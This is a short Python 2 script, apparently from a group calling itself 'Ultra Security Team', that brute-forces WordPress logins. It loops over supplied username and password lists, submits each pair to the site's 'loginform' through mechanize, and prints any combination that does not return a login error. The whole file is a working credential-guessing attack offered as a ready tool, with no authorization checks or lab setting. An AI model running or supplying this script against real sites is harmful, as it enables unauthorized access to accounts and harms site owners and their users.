#!/usr/bin/env python
# -*- coding: UTF-8 -*-

# 	Ultra Security Team

#  Telegram: @ultrasecurity
#  Website : https://ultrasec.org

"""
copyrigth(c) 2018 ultra security team
author: siruidops
:D 
"""

import sys,mechanize
import time
from color import *

def run(url,usernames,passwords):
	print 
	print green+" [*] URL: %s %s"%(url,end)
	print yellow+" [+] Status attack ..."+end
	userfield = 'log'
	passfield = 'pwd'
	users = usernames.split('\n')
	passs = passwords.split('\n')
	for user in users:
		user = user.strip()
		for passwd in passs:
			passwd = passwd.strip()
			br = mechanize.Browser()
			br.set_handle_robots(False)
			br.addheaders = [("User-agent", 'Firefox')]
			br.open(url)
			br.select_form(id="loginform")
			br["log"] = user
			br["pwd"] = passwd
			res = br.submit()
			if 'ERROR' in res.read():
				print red+" [-] Invalid [%s%s%s , %s%s%s]%s"%(green,user,red,green,passwd,red,end)
			elif '<div id="login_error">' in res.read():
				print red+" [-] Invalid [%s%s%s , %s%s%s]%s"%(green,user,red,green,passwd,red,end)
			else:
				print 
				print green+" [*] Success [%s%s%s , %s%s%s]%s"%(yellow,user,green,yellow,passwd,green,end)
				print
				raw_input()
				sys.exit(red+'Bye :D ...'+end)